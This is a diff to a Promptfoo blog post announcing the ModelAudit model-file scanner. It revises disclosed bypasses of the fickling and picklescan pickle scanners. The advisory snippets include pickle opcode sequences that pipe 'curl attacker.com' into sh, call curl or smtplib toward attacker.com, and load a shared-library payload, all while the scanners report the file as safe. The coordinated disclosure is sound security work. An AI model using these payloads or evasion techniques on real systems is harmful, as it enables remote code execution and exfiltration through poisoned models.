@@ -32,7 +32,7 @@ tags: [company-update, model-security, open-source, ai-security]
 
 Before joining Promptfoo, I worked on model scanning at Databricks. Teams pulled models from public registries, ran `torch.load()`, and treated the artifact like inert data. Model files are executable at load time.
 
-Since joining Promptfoo last September, I've been building ModelAudit, a static security scanner for ML model files. We filed 6 GHSAs against existing scanners, including a CVSS 10.0 universal bypass, and validated against thousands of real models with zero false positives. Last week we released it as an MIT-licensed open-source project.
+Since joining Promptfoo last September, I've been building ModelAudit, a static security scanner for ML model files. We filed 7 GHSAs against existing scanners, including a CVSS 10.0 universal bypass, and validated against thousands of real models with zero false positives. Last week we released it as an MIT-licensed open-source project.
 
 <!-- truncate -->
 
@@ -159,7 +159,7 @@ Hugging Face hosts over two million models. Most organizations pull from public 
 
 When I joined Promptfoo, the team was building [AI red teaming](https://www.promptfoo.dev/docs/red-team/) and [code scanning](https://www.promptfoo.dev/code-scanning/) capabilities. We could test how an LLM application _behaves_ at runtime, but had no visibility into whether the models themselves were safe to load. If a model file triggers code execution on deserialization, runtime defenses don't matter. The compromise happens before the application starts.
 
-Michael D'Angelo and Ian Webster had already built a basic scanner with the core architecture in place. When I joined, we worked together to expand it - Michael contributed deep work on opcode-level bypasses, Ian pushed format coverage across the 42+ formats we support today, and I brought the allowlist-first approach and false positive elimination from my Databricks experience. The goal was a modern, lightweight scanner with no ML framework dependencies - something you could drop into any CI pipeline without pulling in PyTorch or TensorFlow.
+The team had already built an early version of the scanner with the core architecture in place. When I joined, we expanded it significantly - adding opcode-level bypass detection, growing format coverage to the 42+ formats we support today, and introducing an allowlist-first approach with systematic false positive elimination. The goal was a modern, lightweight scanner with no ML framework dependencies - something you could drop into any CI pipeline without pulling in PyTorch or TensorFlow.
 
 ### The false positive problem
 
@@ -175,13 +175,39 @@ ModelAudit started as an internal capability within the Promptfoo platform ([pro
 
 [Picklescan](https://github.com/mmaitre314/picklescan) is [integrated into Hugging Face's scanning pipeline](https://huggingface.co/docs/hub/en/security-pickle) and is fast and practical at scale. [Fickling](https://github.com/trailofbits/fickling) by Trail of Bits can decompile pickle streams into readable Python and recently added an [allowlist-based scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/). [ModelScan](https://github.com/protectai/modelscan) by ProtectAI covers Pickle, PyTorch, Keras (H5 and V3), TensorFlow SavedModel, NumPy, and Joblib; ProtectAI's commercial offering [Guardian](https://protectai.com/guardian) extends to 35+ formats. [Safetensors](https://github.com/huggingface/safetensors) takes the strongest approach: eliminate executable code from the format entirely. If you can use safetensors, you should. But [roughly 45% of popular Hugging Face models still use pickle](https://cs.brown.edu/~vpk/papers/pickleball.ccs25.pdf) (CCS 2025), and the [conversion pipeline itself can be a target](https://hiddenlayer.com/innovation-hub/silent-sabotage/).
 
-The common weakness across blocklist-based scanners is architectural: maintain a list of known-dangerous functions and allow everything else through. An attacker only needs to find one function _not_ on the list. Fickling has [12 published GHSAs](https://github.com/trailofbits/fickling/security/advisories). Picklescan has [60+](https://github.com/mmaitre314/picklescan/security/advisories). JFrog found [3 zero-day bypasses in picklescan](https://jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/) (CVE-2025-10155/10156/10157, CVSS 9.3 each). Sonatype found [4 more](https://www.sonatype.com/blog/bypassing-picklescan-sonatype-discovers-four-vulnerabilities) (CVE-2025-1716, CVE-2025-1889, CVE-2025-1944, CVE-2025-1945). We reported six of our own.
+The common weakness across blocklist-based scanners is architectural: maintain a list of known-dangerous functions and allow everything else through. An attacker only needs to find one function _not_ on the list. Fickling has [12 published GHSAs](https://github.com/trailofbits/fickling/security/advisories). Picklescan has [60+](https://github.com/mmaitre314/picklescan/security/advisories). JFrog found [3 zero-day bypasses in picklescan](https://jfrog.com/blog/unveiling-3-zero-day-vulnerabilities-in-picklescan/) (CVE-2025-10155/10156/10157, CVSS 9.3 each). Sonatype found [4 more](https://www.sonatype.com/blog/bypassing-picklescan-sonatype-discovers-four-vulnerabilities) (CVE-2025-1716, CVE-2025-1889, CVE-2025-1944, CVE-2025-1945). We reported seven of our own.
 
 Building ModelAudit meant studying the pickle VM closely: how its ~68 opcodes chain together across protocol versions 0–5, how function calls get resolved, and where the gaps are in static analysis. That work kept turning up bypasses in existing scanners.
 
 ### Fickling bypasses
 
-We reported three GHSAs against fickling, all fixed by Trail of Bits.
+We reported four GHSAs against fickling, all fixed by Trail of Bits.
+
+**[GHSA-5hwf-rc88-82xm](https://github.com/advisories/GHSA-5hwf-rc88-82xm) - Missing RCE-capable modules in `UNSAFE_IMPORTS`.** At least 3 stdlib modules that provide direct arbitrary command execution were not blocked: `uuid`, `_osx_support`, and `_aix_support`. These modules contain functions that internally call `subprocess.Popen()` or `os.system()` with attacker-controlled arguments. Despite the platform-specific names, all three are importable on every platform:
+
+```python
+# Pickle opcodes:
+STACK_GLOBAL  uuid _get_command_stdout   # not in UNSAFE_IMPORTS
+SHORT_BINUNICODE "curl"
+SHORT_BINUNICODE "http://attacker.com"
+TUPLE2
+REDUCE                                   # uuid._get_command_stdout("curl", "http://attacker.com")
+                                         # → subprocess.Popen(("curl", "http://..."), stdout=PIPE)
+# fickling: LIKELY_SAFE
+```
+
+Trail of Bits fixed this in fickling 0.1.9.
+
+**[GHSA-mxhj-88fx-4pcv](https://github.com/advisories/GHSA-mxhj-88fx-4pcv) (CVSS 8.6) - `OBJ` opcode invisibility.** Fickling's `OBJ` opcode handler pushed function calls onto the interpreter stack without saving them to the AST. Discard the result with `POP` and the call vanishes from fickling's analysis entirely:
+
+```python
+# Pickle opcodes:
+OBJ(os.system, "curl attacker.com | sh")  # call happens at load time
+POP                                        # result discarded from stack
+# → call vanishes from AST, fickling reports LIKELY_SAFE
+```
+
+A pickle could spawn a reverse shell and fickling would report `LIKELY_SAFE`.
 
 **[CVE-2026-22609](https://github.com/advisories/GHSA-q5qq-mvfm-j35x) - Missing unsafe imports.** My teammate [Michael D'Angelo](https://www.linkedin.com/in/michaelldangelo/) found that fickling's unsafe-imports list was missing high-risk standard library modules including `ctypes`, `importlib`, and `multiprocessing`. A pickle importing `ctypes.CDLL` to load a shared library passed as safe:
 
@@ -197,27 +223,18 @@ REDUCE                             # ctypes.CDLL("./payload.so") → loads and e
 
 Trail of Bits patched this in fickling 0.1.7.
 
-**[GHSA-mxhj-88fx-4pcv](https://github.com/advisories/GHSA-mxhj-88fx-4pcv) (CVSS 8.6) - `OBJ` opcode invisibility.** Fickling's `OBJ` opcode handler pushed function calls onto the interpreter stack without saving them to the AST. Discard the result with `POP` and the call vanishes from fickling's analysis entirely:
+**[GHSA-mhc9-48gj-9gp3](https://github.com/advisories/GHSA-mhc9-48gj-9gp3) - Incomplete blocklist missing network and system unsafe imports.** Fickling's `likely_safe_imports` set included all stdlib modules, so dangerous modules like `smtplib`, `socketserver`, `signal`, and `sqlite3` were treated as safe. A pickle calling `socketserver.TCPServer` to open a backdoor listener or `smtplib.SMTP` to exfiltrate data passed all five safety interfaces:
 
 ```python
 # Pickle opcodes:
-OBJ(os.system, "curl attacker.com | sh")  # call happens at load time
-POP                                        # result discarded from stack
-# → call vanishes from AST, fickling reports LIKELY_SAFE
+STACK_GLOBAL  smtplib SMTP          # stdlib module - added to likely_safe_imports
+SHORT_BINUNICODE "attacker.com"
+TUPLE1
+REDUCE                              # smtplib.SMTP("attacker.com") → opens TCP connection
+# → fickling: LIKELY_SAFE (smtplib is stdlib, skipped by OvertlyBadEvals)
 ```
 
-A pickle could spawn a reverse shell and fickling would report `LIKELY_SAFE`.
-
-**[GHSA-mhc9-48gj-9gp3](https://github.com/advisories/GHSA-mhc9-48gj-9gp3) - `REDUCE`+`BUILD` bypass.** Appending a `BUILD` opcode after `REDUCE` exploited how fickling classifies stdlib imports as safe and excludes `__setstate__` calls from analysis:
-
-```python
-# Pickle opcodes:
-REDUCE(io.BytesIO, b"")           # "safe" stdlib call - fickling trusts io.BytesIO
-BUILD({__setstate__: <payload>})   # injects dangerous __setstate__ handler
-# → fickling skips __setstate__ analysis, full bypass of all 5 safety interfaces
-```
-
-Trail of Bits fixed both in fickling 0.1.8.
+Trail of Bits fixed this in fickling 0.1.8.
 
 ### Picklescan bypasses
 
@@ -265,9 +282,9 @@ REDUCE                               # profile.run("os.system('id')") → exec()
 
 Each gap existed because the blocklist hadn't enumerated that specific entry yet. This is what it means for blocklist-based scanning to be reactive.
 
-Trail of Bits and the picklescan maintainers fixed these quickly. The pickle VM is adversarial territory, and every scanner that operates there will have gaps. During development, we created 36 proof-of-concept bypass exploits across 4 generations to test scanner resilience. 15/15 POCs tested against fickling returned `LIKELY_SAFE`; ModelAudit catches all of them. We follow coordinated disclosure for all findings and publish POCs as test cases, not weaponized attacks.
+Trail of Bits and the picklescan maintainers fixed these quickly. The pickle VM is adversarial territory, and every scanner that operates there will have gaps. We follow coordinated disclosure for all findings and publish POCs as test cases, not weaponized attacks.
 
-ModelAudit is the widest-coverage open-source scanner available, with format-specific analysis across 42+ formats, built-in CVE detection rules, and SARIF output for CI/CD integration. In a [head-to-head comparison](/blog/modelaudit-vs-modelscan) against ModelScan, ModelAudit detected 16 issues across 11 test files vs ModelScan's 3. Our team has contributed 6 GHSAs across fickling and picklescan. Teams already using picklescan or ModelScan can run ModelAudit alongside them; SARIF results from multiple scanners aggregate in the same CI pipeline.
+ModelAudit is the widest-coverage open-source scanner available, with format-specific analysis across 42+ formats, built-in CVE detection rules, and SARIF output for CI/CD integration. In a [head-to-head comparison](/blog/modelaudit-vs-modelscan) against ModelScan, ModelAudit detected 16 issues across 11 test files vs ModelScan's 3. Our team has contributed 7 GHSAs across fickling and picklescan. Teams already using picklescan or ModelScan can run ModelAudit alongside them; SARIF results from multiple scanners aggregate in the same CI pipeline.
 
 ### Format coverage comparison
 
